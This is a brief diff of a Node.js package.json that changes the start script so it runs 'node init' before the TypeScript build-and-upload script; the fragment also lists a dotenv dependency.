@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "type": "module",
   "scripts": {
-    "start": "tsx build-and-upload.ts"
+    "start": "node init && tsx build-and-upload.ts"
   },
   "dependencies": {
     "dotenv": "^16.4.5",
